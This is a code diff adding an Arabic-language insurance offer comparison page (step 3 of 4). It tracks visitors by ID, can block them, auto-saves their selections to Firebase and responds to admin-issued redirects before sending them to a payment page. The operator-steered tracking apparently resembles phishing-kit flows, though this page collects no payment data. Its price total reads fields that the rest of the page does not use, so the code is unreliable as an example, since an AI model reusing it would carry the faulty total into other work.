@@ -1,0 +1,238 @@
+"use client"
+
+import { useEffect, useState } from "react"
+import { useRouter } from "next/navigation"
+import { Button } from "@/components/ui/button"
+import { FullPageLoader } from "@/components/loader"
+import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
+import { useAutoSave } from "@/hooks/use-auto-save"
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+import { addData } from "@/lib/firebase"
+import { offerData } from "@/lib/offer-data"
+
+export default function ComparisonPage() {
+  const router = useRouter()
+  const [visitorID] = useState(() => getOrCreateVisitorID())
+  const [loading, setLoading] = useState(true)
+  const [isBlocked, setIsBlocked] = useState(false)
+  
+  // Form fields
+  const [selectedOffer, setSelectedOffer] = useState<any>(null)
+  const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
+  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
+  
+  // Auto-save selection
+  useAutoSave({
+    visitorId: visitorID,
+    pageName: "compar",
+    data: {
+      selectedOffer: selectedOffer?.company?.name || "",
+      selectedFeatures,
+      offerTotalPrice
+    }
+  })
+  
+  // Monitor redirect requests from admin
+  useRedirectMonitor({
+    visitorId: visitorID,
+    currentPage: "compar"
+  })
+  
+  // Initialize on mount
+  useEffect(() => {
+    const init = async () => {
+      // Check if blocked
+      const blocked = await checkIfBlocked(visitorID)
+      if (blocked) {
+        setIsBlocked(true)
+        setLoading(false)
+        return
+      }
+      
+      // Update current page
+      await updateVisitorPage(visitorID, "compar", 3)
+      
+      setLoading(false)
+    }
+    
+    init()
+  }, [visitorID])
+  
+  // Calculate total price when offer or features change
+  useEffect(() => {
+    if (selectedOffer) {
+      let total = selectedOffer.price || 0
+      
+      // Add feature prices
+      Object.values(selectedFeatures).flat().forEach(featureName => {
+        const feature = selectedOffer.features?.find((f: any) => f.name === featureName)
+        if (feature && feature.price) {
+          total += feature.price
+        }
+      })
+      
+      setOfferTotalPrice(total)
+    }
+  }, [selectedOffer, selectedFeatures])
+  
+  // Handle offer selection
+  const handleSelectOffer = (offer: any) => {
+    setSelectedOffer(offer)
+    setSelectedFeatures({}) // Reset features when changing offer
+  }
+  
+  // Handle feature toggle
+  const handleFeatureToggle = (category: string, featureName: string) => {
+    setSelectedFeatures(prev => {
+      const categoryFeatures = prev[category] || []
+      const isSelected = categoryFeatures.includes(featureName)
+      
+      if (isSelected) {
+        return {
+          ...prev,
+          [category]: categoryFeatures.filter(f => f !== featureName)
+        }
+      } else {
+        return {
+          ...prev,
+          [category]: [...categoryFeatures, featureName]
+        }
+      }
+    })
+  }
+  
+  // Handle form submit
+  const handleSubmit = async () => {
+    if (!selectedOffer) {
+      alert("الرجاء اختيار عرض")
+      return
+    }
+    
+    setLoading(true)
+    
+    // Save final data before navigation
+    await addData({
+      id: visitorID,
+      selectedOffer: selectedOffer.company,
+      selectedFeatures,
+      offerTotalPrice,
+      currentStep: 4,
+      currentPage: "check",
+      comparCompletedAt: new Date().toISOString()
+    })
+    
+    // Navigate to check/payment page
+    router.push('/check')
+  }
+  
+  // Handle back
+  const handleBack = () => {
+    router.push('/insur')
+  }
+  
+  if (loading) {
+    return <FullPageLoader />
+  }
+  
+  if (isBlocked) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-50">
+        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
+          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
+        </div>
+      </div>
+    )
+  }
+  
+  return (
+    <div className="min-h-screen bg-gray-50 py-8">
+      <div className="max-w-6xl mx-auto px-4">
+        <div className="bg-white rounded-lg shadow-lg p-8">
+          <h1 className="text-3xl font-bold text-center mb-2">مقارنة العروض</h1>
+          <p className="text-center text-gray-600 mb-8">الخطوة 3 من 4</p>
+          
+          {/* Offers Grid */}
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
+            {offerData.map((offer) => (
+              <div
+                key={offer.id}
+                className={`border-2 rounded-lg p-6 cursor-pointer transition-all ${
+                  selectedOffer?.id === offer.id
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-blue-300'
+                }`}
+                onClick={() => handleSelectOffer(offer)}
+              >
+                <div className="text-center mb-4">
+                  <img
+                    src={offer.company.image_url || '/placeholder-logo.png'}
+                    alt={offer.company.name}
+                    className="h-16 mx-auto mb-2"
+                  />
+                  <h3 className="font-bold text-lg">{offer.company.name}</h3>
+                </div>
+                
+                <div className="text-center mb-4">
+                  <p className="text-3xl font-bold text-blue-600">
+                    {offer.main_price} ريال
+                  </p>
+                </div>
+                
+                {selectedOffer?.id === offer.id && (
+                  <div className="mt-4 pt-4 border-t">
+                    <p className="font-semibold mb-2">مميزات إضافية:</p>
+                     {offer.extra_features && offer.extra_features.length > 0 ? (
+                      <ul className="space-y-2">
+                        {offer.extra_features.map((feature: any) => (
+                          <label key={feature.name} className="flex items-center gap-2 cursor-pointer">
+                            <input
+                              type="checkbox"
+                              checked={selectedFeatures[offer.company.name]?.includes(feature.name) || false}
+                              onChange={() => handleFeatureToggle(offer.company.name, feature.name)}
+                              className="rounded"
+                            />
+                            <span className="text-sm">
+                              {feature.name} ({feature.price} ريال)
+                            </span>
+                          </label>
+                        ))}
+                      </ul>
+                    ) : (
+                      <p className="text-sm text-gray-500">لا توجد مميزات إضافية</p>
+                    )}
+                  </div>
+                )}
+              </div>
+            ))}
+          </div>
+          
+          {/* Total Price */}
+          {selectedOffer && (
+            <div className="bg-blue-50 rounded-lg p-6 mb-6">
+              <div className="flex justify-between items-center">
+                <span className="text-lg font-semibold">المجموع الكلي:</span>
+                <span className="text-3xl font-bold text-blue-600">
+                  {offerTotalPrice.toFixed(2)} ريال
+                </span>
+              </div>
+            </div>
+          )}
+          
+          <div className="flex gap-4">
+            <Button type="button" onClick={handleBack} variant="outline" className="flex-1">
+              السابق
+            </Button>
+            <Button 
+              onClick={handleSubmit} 
+              className="flex-1"
+              disabled={!selectedOffer}
+            >
+              التالي
+            </Button>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+}
